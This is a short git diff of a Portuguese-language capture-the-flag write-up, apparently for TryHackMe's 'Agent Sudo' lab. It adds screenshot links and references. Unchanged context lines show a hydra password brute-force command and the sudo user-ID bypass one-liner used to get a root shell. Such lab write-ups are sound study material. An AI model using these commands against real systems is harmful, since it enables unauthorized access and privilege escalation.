@@ -70,6 +70,10 @@ hydra -L possiveis_login -P /usr/share/seclists/Passwords/Common-Credentials/10-
 
 
 ## root no ssh
+![vuln2.jpg](img/descobrir_vuln_root.png)
+
+![vuln2.jpg](img/procurar_root.png)
+
 ![vuln2.jpg](img/root.png)
 
 CVE:
@@ -79,3 +83,12 @@ Comando root
 ```
 sudo -u \#$((0xffffffff)) /bin/bash
 ```
+
+
+
+
+
+
+## Referencias
+https://blog.qz.sg/agent-sudo-ctf-tryhackme/
+https://www.youtube.com/watch?v=jxveUbnOiYk&t=468s
